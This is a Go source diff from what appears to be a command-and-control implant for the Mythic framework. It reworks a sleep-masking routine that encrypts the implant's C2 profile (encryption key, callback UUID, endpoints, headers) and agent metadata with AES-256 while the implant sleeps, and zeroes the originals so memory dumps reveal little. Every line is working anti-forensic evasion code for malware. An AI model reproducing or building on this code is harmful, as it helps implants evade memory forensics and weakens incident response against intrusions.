@@ -54,12 +54,22 @@ type profileSensitiveData struct {
 // agent enters a sleep cycle. The original struct fields are zeroed so a
 // process memory dump during sleep only reveals the encrypted vault.
 //
-// The C2 profile is only encrypted when no tasks are running — active tasks
-// may need the profile to post responses to Mythic during the sleep window.
+// Masking is skipped entirely when tasks are running. Running task goroutines
+// hold pointers to the agent and C2 profile structs — zeroing fields while
+// goroutines use them for PostResponse/GetTasking is a data race. The sleep
+// mask provides its primary value during idle periods (no pending tasks).
 //
 // Returns a vault that must be passed to deobfuscateSleep on wakeup.
-// Returns nil if encryption fails (caller should proceed without masking).
+// Returns nil if encryption fails or tasks are running.
 func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
+	// Skip sleep masking entirely when tasks are running.
+	// Task goroutines read agent fields and C2 profile fields concurrently —
+	// zeroing those fields would be a data race causing silent failures.
+	running := commands.GetRunningTasks()
+	if len(running) > 0 {
+		return nil
+	}
+
 	vault := &sleepVault{}
 
 	// Generate random AES-256 key for this sleep cycle
@@ -103,37 +113,32 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 	agent.ProcessName = ""
 	agent.Description = ""
 
-	// Encrypt C2 profile only when no tasks are running.
-	// Active tasks call c2.PostResponse() which needs the encryption key,
-	// callback UUID, and endpoint URLs.
-	running := commands.GetRunningTasks()
-	if len(running) == 0 {
-		if hp, ok := c2.(*fhttp.HTTPProfile); ok {
-			pd := profileSensitiveData{
-				EncryptionKey: hp.EncryptionKey,
-				BaseURL:       hp.BaseURL,
-				UserAgent:     hp.UserAgent,
-				CallbackUUID:  hp.CallbackUUID,
-				HostHeader:    hp.HostHeader,
-				GetEndpoint:   hp.GetEndpoint,
-				PostEndpoint:  hp.PostEndpoint,
-				CustomHeaders: hp.CustomHeaders,
-			}
-			pPlain, pErr := json.Marshal(pd)
-			if pErr == nil {
-				vault.profileBlob = sleepEncrypt(vault.key, pPlain)
-				zeroBytes(pPlain)
-				if vault.profileBlob != nil {
-					hp.EncryptionKey = ""
-					hp.BaseURL = ""
-					hp.UserAgent = ""
-					hp.CallbackUUID = ""
-					hp.HostHeader = ""
-					hp.GetEndpoint = ""
-					hp.PostEndpoint = ""
-					hp.CustomHeaders = nil
-					vault.profileMasked = true
-				}
+	// Encrypt C2 profile — safe because we already confirmed no tasks running.
+	if hp, ok := c2.(*fhttp.HTTPProfile); ok {
+		pd := profileSensitiveData{
+			EncryptionKey: hp.EncryptionKey,
+			BaseURL:       hp.BaseURL,
+			UserAgent:     hp.UserAgent,
+			CallbackUUID:  hp.CallbackUUID,
+			HostHeader:    hp.HostHeader,
+			GetEndpoint:   hp.GetEndpoint,
+			PostEndpoint:  hp.PostEndpoint,
+			CustomHeaders: hp.CustomHeaders,
+		}
+		pPlain, pErr := json.Marshal(pd)
+		if pErr == nil {
+			vault.profileBlob = sleepEncrypt(vault.key, pPlain)
+			zeroBytes(pPlain)
+			if vault.profileBlob != nil {
+				hp.EncryptionKey = ""
+				hp.BaseURL = ""
+				hp.UserAgent = ""
+				hp.CallbackUUID = ""
+				hp.HostHeader = ""
+				hp.GetEndpoint = ""
+				hp.PostEndpoint = ""
+				hp.CustomHeaders = nil
+				vault.profileMasked = true
 			}
 		}
 	}
